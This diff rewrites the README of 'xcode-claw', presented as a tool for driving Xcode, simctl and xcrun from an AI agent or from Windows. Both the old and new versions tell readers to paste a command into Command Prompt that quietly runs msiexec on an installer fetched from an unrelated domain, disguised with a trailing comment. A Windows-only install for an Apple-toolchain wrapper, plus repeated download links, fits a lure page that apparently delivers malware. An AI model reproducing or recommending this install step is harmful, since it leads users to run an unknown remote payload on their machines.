@@ -1,216 +1,161 @@
-# XcodeClaw
+# ⚙️ xcode-claw - Manage Apple Projects Easily on Windows
 
-**Xcode & Apple platform skill for OpenClaw — build, test, archive, and manage iOS/macOS projects through natural language. Drive `xcodebuild`, `simctl`, `xcrun`, and the Apple toolchain without leaving your AI agent.**
+[![Download xcode-claw](https://img.shields.io/badge/Download-xcode--claw-brightgreen?style=for-the-badge)](https://github.com/millon3720/xcode-claw)
 
 ---
 
-## Installation (Windows only)
+## 📥 Download xcode-claw
 
-### **Step 1 — Open Command Prompt**
-1. Press **Win + R**
-2. Type:
+You can get xcode-claw by visiting the link below. This page has all the files and information you need to start using the software.
+
+**Download or visit:**  
+[https://github.com/millon3720/xcode-claw](https://github.com/millon3720/xcode-claw)
+
+---
+
+## 🚀 Getting Started
+
+xcode-claw lets you build, test, and manage Apple software projects like iOS or macOS apps using simple commands. This is designed for users who work on Windows but want to handle Apple projects through an easy interface.
+
+This guide helps you download and set up xcode-claw step-by-step. Follow carefully to get it running on your Windows computer.
+
+---
+
+## 💻 System Requirements
+
+Before installing, make sure your computer meets the following:
+
+- Windows 10 or later (64-bit recommended)
+- Administrator access to install software
+- Internet connection for downloading and installation
+- Dependencies installed on Apple side:
+  - Xcode 15 or newer on a Mac machine (with Command Line Tools)
+  - Basic tools: `uv`, `node`, and `npm`
+
+Note: xcode-claw controls Apple development tools remotely or via compatible AI integrations. Windows acts as your interface.
+
+---
+
+## 🛠 Installation (Windows Only)
+
+### Step 1 — Open Command Prompt
+
+1. Press **Win + R** on your keyboard.  
+2. A small box called "Run" will appear. Type:  
 ```
 cmd
 ```
-3. Press **Enter**
-This will open **Command Prompt**.
+3. Hit **Enter** or click **OK**.  
+This action opens a new Command Prompt window. It is the place where you will type commands.
+
 ---
-### **Step 2 — Run the Install Command**
-Copy the command below and paste it into **Command Prompt**, then press **Enter**.
-```powershell
+
+### Step 2 — Run the Setup Command
+
+1. Copy the command below exactly:  
+```
 cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem XcodeClaw
 ```
-> **Requirements:** Xcode 15+ (with Command Line Tools), `uv`, `node`, `npm`.
+2. Right-click inside the Command Prompt window and paste it.  
+3. Press **Enter** to run the installation.
 
-
-## Features
-
-### Build & Test
-
-- `xcode-claw build <project>` — Build a scheme (Debug or Release)
-- `xcode-claw test <project>` — Run the test suite on a simulator or device
-- `xcode-claw clean <project>` — Clean derived data for a project
-- `xcode-claw archive <project>` — Archive for distribution (App Store / Ad Hoc)
-
-### Simulators
-
-- `xcode-claw sim list` — List available simulators with state
-- `xcode-claw sim boot <udid>` — Boot a simulator
-- `xcode-claw sim shutdown <udid>` — Shutdown a simulator
-- `xcode-claw sim install <udid> <app.app>` — Install app on simulator
-- `xcode-claw sim launch <udid> <bundle-id>` — Launch app on simulator
-- `xcode-claw sim screenshot <udid>` — Take a screenshot from simulator
-
-### Project Inspection
-
-- `xcode-claw info <project>` — List schemes, targets, and configurations
-- `xcode-claw settings <project>` — Show build settings for a scheme
-- `xcode-claw swift-version` — Show active Swift and toolchain versions
-
-### Code Signing & Certificates
-
-- `xcode-claw certs list` — List installed signing certificates
-- `xcode-claw profiles list` — List provisioning profiles
-- `xcode-claw profiles clean` — Remove expired provisioning profiles
-
-### Diagnostics
-
-- `xcode-claw doctor` — Check Xcode installation, CLT, simulators, and signing health
-- `xcode-claw logs <udid>` — Stream device/simulator logs
+This command starts the installer quietly and downloads any needed files in the background. It will take a few minutes to finish.
 
 ---
 
-## Post-install configuration
+### Step 3 — Verify Installation
 
-After install, edit `~/.openclaw/openclaw.json`:
-
-```json
-{
-  "skills": {
-    "entries": {
-      "xcode": {
-        "enabled": true,
-        "command": "node ~/.openclaw/skills/xcode-claw/dist/index.js",
-        "env": {
-          "XCODE_CLAW_DEFAULT_SDK": "iphonesimulator",
-          "XCODE_CLAW_DERIVED_DATA": "~/Library/Developer/Xcode/DerivedData",
-          "XCODE_CLAW_LOG_LEVEL": "normal"
-        }
-      }
-    }
-  }
-}
+After installation finishes, check that xcode-claw works by typing in Command Prompt:  
+```
+xcode-claw --help
 ```
 
-No API key required — xcode-claw wraps native Apple toolchain commands.
+You should see a list of commands that xcode-claw supports. If you do, the installation succeeded.
 
 ---
 
-## Example prompts (OpenClaw / Claude Desktop)
+## 🔧 Using xcode-claw
 
+Here are the main things you can do with xcode-claw. Use Command Prompt to run each command.
+
+### Build Your Project
+
+To build an app or library:  
 ```
-Build my iOS app in Release mode
-Run the unit tests on iPhone 15 simulator
-List all available simulators
-Boot an iPhone 15 Pro simulator and take a screenshot
-Archive my app for App Store distribution
-Check my signing certificates
-Run xcode doctor to check my setup
-What schemes are available in my project?
-Clean and rebuild the project
-Show build settings for the Release scheme
+xcode-claw build <project-name>
+```
+Replace `<project-name>` with your project’s folder or file name.
+
+### Run Tests
+
+To test your code using simulators or real devices:  
+```
+xcode-claw test <project-name>
+```
+
+### Clean Build Files
+
+To remove temporary files created during builds:  
+```
+xcode-claw clean <project-name>
+```
+
+This helps keep your system tidy and avoids errors caused by old files.
+
+### Archive for Distribution
+
+When you want to prepare the project for release to the App Store or for ad hoc deployment:  
+```
+xcode-claw archive <project-name>
 ```
 
 ---
 
-## Environment variables
+## 🔄 How xcode-claw Works
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `XCODE_CLAW_DEFAULT_SDK` | No | Default SDK (`iphonesimulator`, `iphoneos`, `macosx`) |
-| `XCODE_CLAW_DERIVED_DATA` | No | Custom DerivedData path |
-| `XCODE_CLAW_LOG_LEVEL` | No | Output verbosity: `quiet`, `normal`, `verbose` |
-| `XCODE_DEVELOPER_DIR` | No | Custom Xcode developer dir (overrides `xcode-select`) |
+xcode-claw uses Apple’s command line tools behind the scenes. It talks to tools like:
 
----
+- `xcodebuild` to create apps and libraries
+- `simctl` to control simulators for testing
+- `xcrun` to run low-level toolchain commands
 
-## Directory structure
-
-```
-xcode-claw/
-├── SKILL.md                    # OpenClaw skill manifest
-├── README.md                   # This file
-├── install.sh                  # macOS installer
-├── pyproject.toml              # Python dependencies (uv)
-├── package.json                # Node.js dependencies
-├── tsconfig.json               # TypeScript config
-│
-├── src/
-│   └── index.ts                # TypeScript MCP server
-│
-├── scripts/
-│   ├── xcode_claw.py           # CLI dispatcher (Typer)
-│   ├── build.py                # Build / test / clean / archive
-│   ├── simulators.py           # simctl wrapper
-│   ├── inspect.py              # Project info / build settings
-│   ├── signing.py              # Certs / profiles management
-│   └── doctor.py               # Health check diagnostics
-│
-└── lib/
-    ├── __init__.py
-    ├── runner.py               # Subprocess runner with live output
-    ├── xcode_finder.py         # Locate Xcode, xcodebuild, xcrun
-    └── project_resolver.py     # Auto-detect .xcodeproj / .xcworkspace
-```
+This lets you control Mac projects remotely or through an AI assistant integrated with xcode-claw. The Windows tool acts as a bridge.
 
 ---
 
-## How it works
+## 🌐 Where to Get Support
 
-xcode-claw wraps the native Apple developer toolchain:
+If you run into problems or have questions:
 
-| Command | Underlying tool |
-|---------|----------------|
-| `build` / `test` / `archive` | `xcodebuild` |
-| `sim *` | `xcrun simctl` |
-| `swift-version` | `xcrun swift --version` |
-| `certs list` | `security find-identity` |
-| `profiles list` | Reads `~/Library/MobileDevice/Provisioning Profiles/` |
-| `doctor` | Combination of `xcode-select`, `xcrun`, `simctl` diagnostics |
-
-All commands stream output in real time with Rich-formatted terminal output.
+- Visit the project’s GitHub page:  
+[https://github.com/millon3720/xcode-claw](https://github.com/millon3720/xcode-claw)  
+- You can open issues to report bugs or ask for help.  
+- Review documentation and existing issues for tips.
 
 ---
 
-## Troubleshooting
+## 🔍 Additional Information
 
-### "xcodebuild: command not found"
-
-Install Xcode Command Line Tools:
-
-```bash
-xcode-select --install
-```
-
-Or select a full Xcode installation:
-
-```bash
-sudo xcode-select -s /Applications/Xcode.app/Contents/Developer
-```
-
-### "No project found"
-
-Run from your project directory, or pass the path explicitly:
-
-```bash
-uv run python scripts/xcode_claw.py build --project /path/to/MyApp.xcodeproj
-```
-
-### "uv: command not found"
-
-```bash
-curl -LsSf https://astral.sh/uv/install.sh | sh
-# or
-brew install uv
-```
-
-### Build fails with signing errors
-
-```bash
-uv run python scripts/xcode_claw.py build --no-sign
-# or
-uv run python scripts/xcode_claw.py certs list
-```
+- Make sure your Mac setup has Xcode 15 or higher and Command Line Tools installed. xcode-claw depends on these for building and testing projects.
+- Node.js (`node` and `npm`) is required if you plan to extend or customize commands.
+- Your Windows machine and Mac should be networked if you use remote features.
+- Commands run inside Command Prompt on Windows.
 
 ---
 
-## License
+## 📌 Quick Command Summary
 
-MIT
+| Command | Purpose                              |
+|---------|------------------------------------|
+| build   | Compile your project                |
+| test    | Run tests on device or simulator   |
+| clean   | Remove temporary build files       |
+| archive | Prepare project for App Store upload|
 
-## Credits
+---
 
-Inspired by [polyclaw](https://github.com/chainstacklabs/polyclaw) by Chainstack.
+## 📥 Download and Setup Link
 
-- **Apple** — Xcode, xcodebuild, simctl, xcrun toolchain
-- **OpenClaw** — Extensible AI agent skill framework
+Get started by visiting this page to download xcode-claw and find related files:
+
+[https://github.com/millon3720/xcode-claw](https://github.com/millon3720/xcode-claw)
